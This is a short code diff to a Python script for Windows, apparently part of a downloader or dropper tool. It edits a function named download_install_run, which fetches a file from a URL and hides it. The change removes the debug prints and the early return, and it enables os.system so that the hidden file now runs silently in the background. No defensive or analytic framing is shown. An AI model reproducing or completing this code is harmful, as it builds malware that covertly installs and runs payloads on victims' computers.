@@ -16,13 +16,10 @@ def download_install_run(url, specialpath, fname):
     f.close()
     u.close()
     hide_file(path)
-    print path
     
     #Make a command to run the file
     command = "start /b %s"%win32api.GetShortPathName(path)
-    print command
-    return
-    #os.system(command)
+    os.system(command)
     
         
 #Utility functions.  May be useful elsewhere
